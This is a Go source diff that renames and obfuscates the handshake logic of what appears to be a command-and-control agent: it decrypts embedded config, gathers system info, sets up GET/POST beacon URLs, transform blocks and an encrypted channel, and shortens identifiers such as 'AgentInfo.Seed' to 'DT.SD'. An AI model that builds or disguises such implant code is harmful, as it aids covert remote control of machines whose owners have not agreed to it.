@@ -9,13 +9,13 @@ import (
 	"fmt"
 )
 
-type HandshakeManager struct {
-	decryptedValues *DecryptedConfig
+type ConnMgr struct {
+	decryptedValues *ResolvedConfig
 	currentClientID string
 	initialClientID string // Store the very first client ID
 	getURL          string
 	postURL         string
-	secureComms     *SecureComms
+	secureComms     *SecChan
 
 	// Parsed transform DataBlocks
 	getClientIDDataBlock  *DataBlock
@@ -24,10 +24,10 @@ type HandshakeManager struct {
 	responseDataDataBlock *DataBlock
 }
 
-func NewHandshakeManager() (*HandshakeManager, error) {
+func newHandshakeManager() (*ConnMgr, error) {
 	decrypted := decryptAllValues()
 
-	hm := &HandshakeManager{
+	hm := &ConnMgr{
 		decryptedValues: decrypted,
 		initialClientID: getClientID(),
 	}
@@ -49,15 +49,15 @@ func NewHandshakeManager() (*HandshakeManager, error) {
 	return hm, nil
 }
 
-func (hm *HandshakeManager) PerformHandshake() error {
+func (hm *ConnMgr) performHandshake() error {
 	// Step 1: Collect fresh system info with new seed
-	sysInfoReport, err := CollectSystemInfo(hm.initialClientID) // Use initial client ID
+	sysInfoReport, err := collectSystemInfo(hm.initialClientID) // Use initial client ID
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Step 2: Convert to JSON
-	jsonOutput, err := sysInfoReport.ToJSON()
+	jsonOutput, err := sysInfoReport.toJSON()
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
@@ -131,10 +131,10 @@ func (hm *HandshakeManager) PerformHandshake() error {
 	}
 
 
-	// Step 9: Initialize SecureComms with initial secret and new seed
+	// Step 9: Initialize SecChan with initial secret and new seed
 	hm.secureComms = NewSecureComms(
 		hm.decryptedValues.Secret,
-		sysInfoReport.AgentInfo.Seed,
+		sysInfoReport.DT.SD,
 	)
 
 	// Step 10: Initialize polling config with new parameters
@@ -145,10 +145,10 @@ func (hm *HandshakeManager) PerformHandshake() error {
 	return nil
 }
 
-func (hm *HandshakeManager) RefreshHandshake() error {
+func (hm *ConnMgr) refreshHandshake() error {
 	oldClientID := hm.currentClientID
 
-	err := hm.PerformHandshake()
+	err := hm.performHandshake()
 	if err != nil {
 		// On error, ensure we restore old client ID
 		hm.currentClientID = oldClientID
@@ -159,23 +159,23 @@ func (hm *HandshakeManager) RefreshHandshake() error {
 	return nil
 }
 
-func (hm *HandshakeManager) GetCurrentClientID() string {
+func (hm *ConnMgr) getCurrentClientID() string {
 	return hm.currentClientID
 }
 
-func (hm *HandshakeManager) GetCurrentURLs() (string, string) {
+func (hm *ConnMgr) getCurrentURLs() (string, string) {
 	return hm.getURL, hm.postURL
 }
 
-func (hm *HandshakeManager) SetClientID(clientID string) {
+func (hm *ConnMgr) setClientID(clientID string) {
 	hm.currentClientID = clientID
 }
 
-func (hm *HandshakeManager) GetSecureComms() *SecureComms {
+func (hm *ConnMgr) getSecureComms() *SecChan {
 	return hm.secureComms
 }
 
-// GetTransformDataBlocks returns all parsed DataBlock configurations
-func (hm *HandshakeManager) GetTransformDataBlocks() (getClientID, postClientID, postData, responseData *DataBlock) {
+// getTransformDataBlocks returns all parsed DataBlock configurations
+func (hm *ConnMgr) getTransformDataBlocks() (getClientID, postClientID, postData, responseData *DataBlock) {
 	return hm.getClientIDDataBlock, hm.postClientIDDataBlock, hm.postDataDataBlock, hm.responseDataDataBlock
 }
